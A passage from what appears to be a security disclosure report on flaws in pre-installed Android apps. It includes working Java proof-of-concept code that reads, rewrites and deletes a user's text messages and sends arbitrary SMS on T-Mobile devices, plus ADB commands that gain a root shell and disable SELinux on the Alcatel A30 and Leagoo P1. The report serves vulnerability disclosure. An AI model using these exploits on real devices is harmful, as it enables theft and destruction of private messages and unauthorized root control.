where 
the 
authority 
string 
is 
com.android.messaging.datamodel.MessagingContentProvider/conversations. Below is the 
output of querying this content provider. The text messages that are sent by the device owner are the ones 
where the snippet_sender_display_destination field is null.  
Row: 0 _id=2, name=(703) 555-0001, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/d?i=%2B17035550001, participant_contact_id=-2, 
participant_lookup_key=NULL, participant_normalized_destination=+17035550001, 
sort_timestamp=1526866037215, show_draft=0, draft_snippet_text=, draft_preview_uri=, 
draft_subject_text=, draft_preview_content_type=, preview_uri=NULL, preview_content_type=NULL, 
participant_count=1, notification_enabled=1, notification_sound_uri=NULL, 
notification_vibration=1, include_email_addr=0, message_status=100, raw_status=0, 
message_id=12, snippet_sender_first_name=NULL, snippet_sender_display_destination=(703) 555-
0001, snippet_text=Here is a text message, subject_text=NULL 
Row: 1 _id=3, name=(703) 555-0002, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/d?i=%2B17035550002, participant_contact_id=-2, 
participant_lookup_key=NULL, participant_normalized_destination=+17035550002, 
sort_timestamp=1526863999559, show_draft=0, draft_snippet_text=, draft_preview_uri=, 
draft_subject_text=, draft_preview_content_type=, preview_uri=NULL, preview_content_type=NULL, 
participant_count=1, notification_enabled=1, notification_sound_uri=NULL, 
notification_vibration=1, include_email_addr=0, message_status=1, raw_status=0, message_id=8, 
snippet_sender_first_name=Mike, snippet_sender_display_destination=, snippet_text=Test. Holla 
back, subject_text=NULL 
Row: 2 _id=1, name=Random Guy, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/l?n=Random%20Guy&i=1516r11-4B29432F4541355159, 
participant_contact_id=11, participant_lookup_key=1516r11-4B29432F4541355159, 
participant_normalized_destination=+17035550003, sort_timestamp=1526863649747, show_draft=0, 
draft_snippet_text=, draft_preview_uri=, draft_subject_text=, draft_preview_content_type=, 
preview_uri=NULL, preview_content_type=NULL, participant_count=1, notification_enabled=1, 
notification_sound_uri=NULL, notification_vibration=1, include_email_addr=0, message_status=1, 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
raw_status=0, message_id=5, snippet_sender_first_name=Mike, 
snippet_sender_display_destination=, snippet_text=Here is a longer message. One more, 
subject_text=NULL 
6.2 Insecure RCS App on T-Mobile Devices 
We discovered an insecure pre-installed app that handles RCS with a package name of 
com.rcs.gsma.na.sdk (or a refactored version of the app) on three devices. There was a refactored version 
of the same app with almost the same functionality with a different package name 
(com.suntek.mway.rcs.app.service). We are unsure if this app has other refactored instances with 
additional package names. This app allows any app co-located on the device to read, delete, insert, and 
modify the user’s text messages, send arbitrary text messages, and obtain the phone numbers of the user’s 
contacts. All of these capabilities are done without the required permissions since the 
com.rcs.gsma.na.sdk app externally exposes them and does not set permissions requirements to access 
them. All of the devices we confirmed that contain this app were sold as T-Mobile devices: Coolpad Defiant, 
T-Mobile Revvl Plus, and ZTE Zmax Pro. We will explain the vulnerabilities on the T-Mobile Revvl Plus 
although the source code to exploit the vulnerabilities on the other two devices are almost exactly the same 
except for a different package name and component names due to refactoring. 
The T-Mobile Revvl Plus contains a pre-installed app with a package name of com.rcs.gsma.na.sdk 
(versionCode=1, versionName=RCS_SDK_20170804_01). This app executes as the system user (a 
privileged user) and cannot be disabled by the end-user. This application appears to handle RCS on the 
device. This application has 7 content providers that are exported and not protected by a permission, which 
makes them accessible to any app co-located on the device. Content provider application components are 
not exported by default, but the developers of this app explicitly exported them. A content provider acts as 
a repository for structured data and supports the standard SQL operations. Some of these content providers 
in the com.rcs.gsma.na.sdk app act as a wrapper where they internally access and operate on a different 
content provider. A content provider is accessed using an authority string. There is a content provider with 
a class name of com.rcs.gsma.na.provider.message.MessageProvider with an authority string of 
com.rcs.gsma.na.provider.message. When the com.rcs.gsma.na.provider.message authority is 
queried, it will query the sms authority (e.g., content://sms) and return the user’s sent and received text 
messages. Each text message entry includes a timestamp, phone number, message body, flag for whether 
the user has seen the message or not, etc. The source code below will return a string containing all of the 
user’s sent and received text messages. An example output of this method is provided in Appendix D. 
Uri aUri = Uri.parse("content://com.rcs.gsma.na.provider.message"); 
ContentResolver cr = getContentResolver(); 
Cursor cursor = cr.query(aUri, null, null, null, null); 
String allData = ""; 
String temp = ""; 
if (cursor == null || cursor.getCount() == 0) 
    return null; 
cursor.moveToFirst(); 
do { 
    int columnCount = cursor.getColumnCount(); 
    for(int id=0; id < cursor.getColumnCount(); id++) { 
        int type = cursor.getType(id); 
        if (type == 4) 
            continue; 
        temp = " " + cursor.getColumnName(id) + ":" + cursor.getString(id); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
        allData += temp; 
        Log.d("Key-Value pair", temp); 
    } 
    allData += "\n"; 
} while(cursor.moveToNext()); 
return allData; 
The source code below will change the body of all the user’s sent and received text messages to the word 
“goodbye”. The content of individual messages can be modified by adding a where clause and selection 
arguments for a specific message id.   
ContentResolver cr = getContentResolver(); 
ContentValues cv = new ContentValues(); 
cv.put("body","goodbye"); 
cr.update(Uri.parse("content://com.rcs.gsma.na.provider.message"), cv, null, null); 
The source code below will delete all of the user’s text messages. 
ContentResolver cr = getContentResolver(); 
cr.delete(Uri.parse("content://com.rcs.gsma.na.provider.message"), null, null); 
The phone numbers of the user’s contacts can be obtained from the com.rcs.gsma.na.sdk app. This app 
has 
a 
content 
provider 
application 
component 
with 
a 
class 
name 
of 
com.rcs.gsma.na.provider.capability.CapabilityProvider 
with 
an 
authority 
string 
of 
com.rcs.gsma.na.provider.capability. The CapabilityProvider component acts as a wrapper to 
the content://com.android.contacts Uniform Resource Interface (URI). The output from querying the 
CapabilityProvider content provider is provided in Appendix E and is queried in the same way as 
querying for the user’s text messages (provided above). 
In the com.rcs.gsma.na.sdk app, there is a broadcast receiver application component with a fully-
qualified class name of com.rcs.gsma.na.test.TestReceiver. This component is explicitly exported 
and allows a user to send a text message where the phone number and message can be chosen by the sender. 
This can be abused to send text messages to premium numbers or be used to send a distasteful message to 
all the user’s contacts.  
Intent i = new Intent("com.rcs.gsma.na.sdk.TestReceiver"); 
i.setClassName("com.rcs.gsma.na.sdk", "com.rcs.gsma.na.test.TestReceiver"); 
i.putExtra("type", 110); 
i.putExtra("number", "7035557777"); 
i.putExtra("isLarge", false); 
i.putExtra("value", "help?!?!?"); 
sendBroadcast(i); 
7. Local Root Privilege Escalation via ADB 
We discovered two devices that allow the user to obtain root privileges by entering commands via ADB: 
Alcatel A30 and Leagoo P1. These two devices allow a user with physical access to the device to obtain a 
root shell on the device by allowing the shell user (ADB) to modify read-only properties at runtime. This 
undocumented feature goes against the standard Android security model. Recently, a Twitter user with the 
handle of Elliot Anderson discovered that certain OnePlus devices can obtain root access via ADB28. 
28 https://www.xda-developers.com/oneplus-root-access-backdoor/ 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Notably, the Alcatel A30 was an Amazon Prime exclusive device29. We will focus on the Alcatel A30 
device, although the approach to obtain a root shell via ADB is the same for both devices: modify read-only 
properties at runtime and restart the ADB daemon so it executes as the root user. 
7.1 Alcatel A30 – Root Privilege Escalation via ADB 
Allowing the modification of read-only properties at runtime allows either a user with physical access to 
the device or the vendor (specifically TCL Corporation) to execute commands as the root user. The 
properties of concern here are ro.debuggable and ro.secure. Notably, on the Alcatel A30 device, 
changing the ro.debuggable property to have a value of 1 will create a UNIX domain socket named 
factory_test that will execute the commands supplied to it as the root user. This behavior is not present 
on the Leagoo P1 device. This allows the vendor to execute commands as the root user if they change the 
value of the ro.debuggable property and use a process that has access to write to the factory_test socket 
in the /dev/socket directory, although we did not witness the behavior. Moreover, we verified that 
platform apps can change the ro.debuggable property at runtime. Alcatel should control the framework 
key since they are the vendor and have certain apps that are executing as the system user. In addition, they 
also control the SELinux rules to control which processes can interact with the factory_test socket. 
The end-user can also obtain root privileges by restarting ADB as root using certain commands via ADB. 
This allows a root shell via ADB to be obtained for command execution as the root user. At this point, 
root privileges can be used to obtain a permanent root privilege as opposed to a temporary one. Using 
root privileges, the private directories of apps, among others, can be examined and exfiltrated. For ADB 
to be able to execute commands as the root user, instead of the usual shell user, the ro.debuggable 
property needs to be set to a value of 1 and the ro.secure property needs to be set to a value of 0. At this 
point, the user can use the adb root command, which will restart the adbd process running as the root 
user. With root privileges, SELinux can be disabled to prevent the Mandatory Access Control (MAC) rules 
from preventing certain actions on the device using the setenforce 0 command. Below are the commands 
to enter using ADB to obtain a root shell. 
adb shell setprop ro.debuggable 1 
adb shell setprop ro.secure 0 
adb shell root 
adb shell setenforce 0 
adb shell 
MICKEY6US:/ # id 
uid=0(root) gid=0(root) 
groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admi
n),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0 
Below is the factory_test UNIX domain socket in the /dev/socket directory from the Alcatel A30 
device. 
MICKEY6US:/dev/socket # ls –al 
total 0 
drwxr-xr-x  7 root      root       760 2017-05-10 17:58 . 
drwxr-xr-x 15 root      root      4220 2017-05-10 17:55 .. 
29 https://www.theverge.com/circuitbreaker/2017/3/24/15042450/alcatel-a30-moto-g5-plus-amazon-prime-exclusive-phones-
ad-lockscreen 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
srw-rw----  1 system    system       0 2017-05-10 17:58 adbd 
srw-rw----  1 root      inet         0 1970-11-08 00:12 cnd 
srw-rw----  1 root      mount        0 1970-11-08 00:12 cryptd 
srw-rw----  1 root      inet         0 1970-11-08 00:12 dnsproxyd 
srw-rw----  1 root      system       0 1970-11-08 00:12 dpmd 
srw-rw----  1 system    inet         0 2017-05-10 17:55 dpmwrapper 
srw-rw-rw-  1 root      root         0 2017-05-10 17:58 factory_test 
On the Alcatel A30 device, the init.rc file contains the logic to start the /system/bin/factory_test 
binary once the ro.debuggable property is set to a value of 1. 
on property:ro.debuggable=1 
    start bt_wlan_daemon 
service bt_wlan_daemon /system/bin/factory_test 
    user root 
    group root 
    oneshot 
    seclabel u:r:bt_wlan_daemon:s0 
7.2 Leagoo P1 – Root Privilege Escalation via ADB 
Similar behavior is also (except the factory_test socket) present on a Leagoo P1 device with a build 
fingerprint of 
sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/release-
keys. Below are the ADB commands, almost the same as the Alcatel A30 device, to obtain a root shell via 
ADB. The difference here is that SELinux does not need to be enabled since the the SELinux context 
granted to  
adb shell setprop ro.debuggable 1 
adb shell setprop ro.secure 0 
adb shell root 
adb shell 
t592_otd_p1:/ # id 
uid=0(root) gid=0(root) 
groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admi
n),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0 
8. Programmatically Factory Resetting the Device 
A factory reset will wipe the data and cache partitions. This removes any apps the user has installed and 
any other user or app data that the user does not have backed up externally. An unintentional factory reset 
can present a major inconvenience due to potential for data loss. For an app to be able to directly factory 
reset a device, it requires that an app have the MASTER_CLEAR permission30. This permission is only granted 
to apps that are pre-installed. Therefore, a third-party app that the user downloads cannot perform a factory 
reset of the device directly. There is an exception for enabled Mobile Device Management (MDM) apps. A 
user can download an MDM app and then enable it as a device administrator through the Settings app. Prior 
to enabling the app as a device administrator, the user will be presented with its list of capabilities, which 
can include the “erase all data” capability. All of the vulnerabilities we found were due to an app privileged 
30 https://developer.android.com/reference/android/Manifest.permission.html#MASTER_CLEAR 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
enough to perform a factory reset (i.e., apps that are granted the MASTER_CLEAR permission and platform 
apps) exposing an interface that, when called, will programmatically initiate a factory reset of the device. 
A privileged app can initiate a factory reset of the device by sending a broadcast intent with an action of 
android.intent.action.MASTER_CLEAR. The system_server process contains a broadcast receiver 
named com.android.server.MasterClearReceiver that, when it receives the MASTER_CLEAR action, will 
boot into recovery mode to format the data and cache partitions. This is generally accomplished by calling 
a method with a signature that is similar to the following method although the parameters can vary: 
android.os.RecoverySystem.rebootWipeUserData(*). This method writes content to a file with a path 
of /cache/recovery/command that contains at least the line of --wipe_data and boots into recovery mode. 
8.1 T-Mobile Revvl Plus & T-Mobile Coolpad Defiant – Factory Reset 
The T-Mobile Revvl Plus device31 and the T-Mobile Coolpad Defiant32 have a pre-installed app with a 
package 
name 
of 
com.qualcomm.qti.telephony.extcarrierpack 
(versionCode=25, 
versionName=7.1.1). This app is privileged since it executes as the system user. This app contains a 
broadcast 
receiver 
application 
component 
with 
a 